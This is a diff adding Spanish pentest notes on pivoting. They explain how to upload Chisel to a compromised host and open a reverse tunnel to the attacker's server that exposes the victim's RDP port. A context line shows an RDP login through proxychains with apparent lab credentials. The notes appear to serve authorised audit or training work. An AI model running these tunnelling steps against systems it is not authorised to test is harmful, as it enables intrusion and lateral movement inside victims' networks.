@@ -190,3 +190,36 @@ Dependiendo del nivel de acceso que tengamos a este host durante una auditoría,
 proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 ```
 
+### Hacer Port Forwarding con Chisel
+
+Chisel es una herramienta que permite establecer túneles TCP (port forwarding) a través de una conexión HTTP/HTTPS, útil en escenarios de pivoting y redes segmentadas. Primero, descargamos chisel para posteriormente subirlo a la máquina víctima.
+
+```
+wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
+gunzip chisel_1.8.1_linux_amd64.gz
+mv chisel_1.8.1_linux_amd64 chisel
+chmod +x chisel
+```
+
+Subimos la herramienta mediante `scp` o de cualquier otra forma conveniente. En este punto, configuramos el servidor en la máquina que actuará como listener, en este caso, la nuestra:
+
+```bash
+./chisel server --port 8000 --reverse
+```
+
+- `--port 8000`: puerto donde escucha el servidor Chisel.
+- `--reverse`: permite conexiones reversas desde los clientes.
+
+El siguiente punto es en la máquina víctima (*host comprometido*) establecer el cliente (*Port Forwarding hacia una máquina interna*):
+
+```bash
+chisel client <IP_del_Servidor>:8000 R:9999:127.0.0.1:3389
+```
+
+- `client <IP>:8000`: conecta al servidor Chisel en el puerto 8000.
+- `R:9999:127.0.0.1:3389`: establece un túnel reverso que expone el puerto 3389 (RDP local del cliente) como si estuviera disponible en el puerto 9999 del servidor.
+
+🔁 Esto permite conectarte desde tu equipo al puerto 9999 del servidor Chisel, y terminaremos accediendo al servicio RDP (puerto 3389) de la máquina comprometida.
+
+
+
